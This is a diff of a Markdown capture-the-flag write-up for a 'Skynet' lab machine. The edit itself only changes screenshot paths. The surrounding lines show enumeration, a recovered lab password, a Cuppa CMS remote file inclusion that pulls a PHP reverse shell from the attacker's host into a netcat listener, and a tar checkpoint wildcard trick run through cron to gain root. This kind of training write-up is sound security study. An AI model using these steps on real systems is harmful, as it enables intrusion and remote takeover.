@@ -39,7 +39,7 @@ sudo nmap -sC -sV -p- -T4 -oA nmap/full_tcp_10.130.139.117 10.130.139.117
 
 Browsing to `http://10.130.139.117/` displays a custom Skynet search engine interface:
 
-![Screenshot](../../attachments/Pasted%20image%2020260603120510.png)
+![Screenshot](../../attachments/Pasted image 20260603120510.png)
 
 A directory brute-force attack using Gobuster identified the following endpoints:
 
@@ -55,12 +55,12 @@ gobuster dir -u http://10.130.139.117/ -w /usr/share/wordlists/dirb/common.txt
 
 Navigating to `/squirrelmail/` presents a SquirrelMail login interface:
 
-![Screenshot](../../attachments/Pasted%20image%2020260603121430.png)
-![Screenshot](../../attachments/Pasted%20image%2020260603121816.png)
+![Screenshot](../../attachments/Pasted image 20260603121430.png)
+![Screenshot](../../attachments/Pasted image 20260603121816.png)
 
 Checking POP3/IMAP services on ports 110 and 143 returned standard banners without enabling anonymous access:
 
-![Screenshot](../../attachments/Pasted%20image%2020260603122413.png)
+![Screenshot](../../attachments/Pasted image 20260603122413.png)
 
 ### 1.3 SMB Enumeration
 
@@ -70,7 +70,7 @@ Enumerating SMB shares via `enum4linux`:
 enum4linux -a 10.130.139.117
 ```
 
-![Screenshot](../../attachments/Pasted%20image%2020260603142020.png)
+![Screenshot](../../attachments/Pasted image 20260603142020.png)
 
 The enumeration identified an accessible `anonymous` share alongside user shares including `milesdyson`.
 
@@ -80,7 +80,7 @@ Connecting to the anonymous share with `smbclient`:
 smbclient //10.130.139.117/anonymous -N
 ```
 
-![Screenshot](../../attachments/Pasted%20image%2020260603142540.png)
+![Screenshot](../../attachments/Pasted image 20260603142540.png)
 
 Inspecting the downloaded files:
 - `attention.txt`: A memorandum signed by **Miles Dyson** notifying staff that all employee passwords had been changed due to a system malfunction.
@@ -99,17 +99,17 @@ Using the targeted password list `log1.txt`, credential spraying was performed a
 - **Username:** `milesdyson`
 - **Password:** `cyborg007haloterminator`
 
-![Screenshot](../../attachments/Pasted%20image%2020260603144410.png)
+![Screenshot](../../attachments/Pasted image 20260603144410.png)
 
 Inside the mailbox, the first email contained Miles Dyson's personal SMB password:
 
-![Screenshot](../../attachments/Pasted%20image%2020260603144625.png)
+![Screenshot](../../attachments/Pasted image 20260603144625.png)
 
 Subsequent emails contained AI-generated dialogue and lyrics:
 
-![Screenshot](../../attachments/Pasted%20image%2020260603144942.png)
-![Screenshot](../../attachments/Pasted%20image%2020260603145025.png)
-![Screenshot](../../attachments/Pasted%20image%2020260603145202.png)
+![Screenshot](../../attachments/Pasted image 20260603144942.png)
+![Screenshot](../../attachments/Pasted image 20260603145025.png)
+![Screenshot](../../attachments/Pasted image 20260603145202.png)
 
 ### 2.2 Authenticated SMB Access & Hidden Directory
 
@@ -119,12 +119,12 @@ Using the extracted password, access was authenticated to Miles Dyson's private 
 smbclient //10.130.139.117/milesdyson -U milesdyson
 ```
 
-![Screenshot](../../attachments/Pasted%20image%2020260603154100.png)
+![Screenshot](../../attachments/Pasted image 20260603154100.png)
 
 Navigating into the `notes` directory revealed `important.txt`:
 
-![Screenshot](../../attachments/Pasted%20image%2020260603154509.png)
-![Screenshot](../../attachments/Pasted%20image%2020260603154550.png)
+![Screenshot](../../attachments/Pasted image 20260603154509.png)
+![Screenshot](../../attachments/Pasted image 20260603154550.png)
 
 The file discloses a hidden web directory: `/45kra24zxs28v3yd/`.
 
@@ -138,7 +138,7 @@ gobuster dir -u http://10.129.157.110/45kra24zxs28v3yd/ -w /usr/share/wordlists/
 
 The scan identifies an administrative interface: `/45kra24zxs28v3yd/administrator`:
 
-![Screenshot](../../attachments/Pasted%20image%2020260603162536.png)
+![Screenshot](../../attachments/Pasted image 20260603162536.png)
 
 The page runs an instance of **Cuppa CMS**.
 
@@ -150,7 +150,7 @@ Searching for exploits targeting Cuppa CMS:
 searchsploit cuppa cms
 ```
 
-![Screenshot](../../attachments/Pasted%20image%2020260603170740.png)
+![Screenshot](../../attachments/Pasted image 20260603170740.png)
 
 > [!NOTE] Concept: Remote File Inclusion (RFI)
 > The script `/alerts/alertConfigField.php` accepts a parameter `urlConfig` that directly includes remote PHP files via `include()` or `require()` without sanitization or disabling `allow_url_include`.
@@ -162,7 +162,7 @@ searchsploit cuppa cms
 python3 -m http.server 80
 ```
 
-![Screenshot](../../attachments/Pasted%20image%2020260604003559.png)
+![Screenshot](../../attachments/Pasted image 20260604003559.png)
 
 2. Set up a Netcat listener:
 
@@ -170,7 +170,7 @@ python3 -m http.server 80
 nc -lvnp 4444
 ```
 
-![Screenshot](../../attachments/Pasted%20image%2020260604003650.png)
+![Screenshot](../../attachments/Pasted image 20260604003650.png)
 
 3. Trigger the RFI via GET request:
 
@@ -178,7 +178,7 @@ nc -lvnp 4444
 http://10.129.157.110/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.10.14.5/php-reverse-shell.php
 ```
 
-![Screenshot](../../attachments/Pasted%20image%2020260604003724.png)
+![Screenshot](../../attachments/Pasted image 20260604003724.png)
 
 The server fetches the remote file, executes the payload, and connects to the listener as `www-data`.
 
@@ -244,7 +244,7 @@ nc -lvnp 1234
 
 Within 60 seconds, the cron job executes, parses `--checkpoint-action=exec=sh shell.sh`, and invokes `shell.sh` as `root`:
 
-![Screenshot](../../attachments/Pasted%20image%2020260604010756.png)
+![Screenshot](../../attachments/Pasted image 20260604010756.png)
 
 ```bash
 id
